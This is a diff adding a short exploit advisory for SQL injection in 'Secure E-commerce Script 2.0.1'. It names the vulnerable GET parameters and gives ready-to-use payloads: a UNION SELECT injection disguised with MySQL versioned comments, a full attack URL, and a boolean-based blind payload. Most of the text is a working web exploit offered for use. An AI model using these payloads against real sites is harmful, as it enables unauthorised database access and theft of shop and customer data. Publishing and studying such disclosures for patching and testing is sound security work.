@@ -1,0 +1,34 @@
+# # # # # 
+# Exploit Title: Secure E-commerce Script 2.0.1 - SQL Injection
+# Dork: N/A
+# Date: 09.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/secure-e-commerce-script/
+# Version: 2.0.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/category.php?searchmain=[SQL]&searchcat=[SQL]
+# http://localhost/[PATH]/single_detail.php?sid=[SQL]
+# 
+# 1'++/*!50000UNION*/+/*!50000SELECT*/+1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-
+# 
+# http://server/category.php?searchmain=1'++/*!50000UNION*/+/*!50000SELECT*/+1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-
+# 
+# Parameter: searchmain (GET)
+#   Type: boolean-based blind
+#   Title: AND boolean-based blind - WHERE or HAVING clause
+#   Payload: searchmain=1' AND 9950=9950 AND 'nOyB'='nOyB&searchcat=a
+# 
+# # # # #
